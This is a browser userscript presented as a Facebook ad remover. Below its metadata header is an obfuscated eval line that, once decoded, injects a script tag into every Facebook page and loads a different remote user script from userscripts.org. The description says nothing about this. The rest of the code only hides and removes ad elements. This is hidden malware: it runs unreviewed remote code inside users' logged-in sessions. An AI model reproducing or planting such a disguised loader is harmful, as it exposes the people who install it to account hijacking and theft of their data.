// ==UserScript==
// @name           Remove All Facebook Ads Pro + Last Update
// @include       http*://*.facebook.com/*
// @author         http://joshdick.net/programs
// @version        1.4
// @namespace      http://userscripts.org/scripts/show/13787
// @description    Removes any and all ads from Facebook.
// @include        *facebook.com*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


function Remove_All_Facebook_Ads() {

	var sidebar_ads = document.getElementById('sidebar_ads');
	if (sidebar_ads && sidebar_ads.style.visibility != 'hidden') { //Prevents the visibility from being set multiple times unnecessarily
		//GM_log("Removing Facebook sidebar ads.");
		sidebar_ads.style.visibility = 'hidden';
	}

  	var elements = document.evaluate(
		"//div[contains(@class, 'ad_capsule')] | //div[contains(@class, 'social_ad')] | //div[contains(@class, 'sponsor')] | //div[contains(@id, 'sponsor')]",
		document,
		null,
		XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
		null
	);

	for (var i = 0; i < elements.snapshotLength; i++) {
		var thisElement = elements.snapshotItem(i);
		//GM_log("Removing Facebook ad element with class='" + thisElement.className + "' and id='" + thisElement.id + "'.");
    	thisElement.parentNode.removeChild(thisElement);
	}

}

document.addEventListener("DOMNodeInserted", Remove_All_Facebook_Ads, true);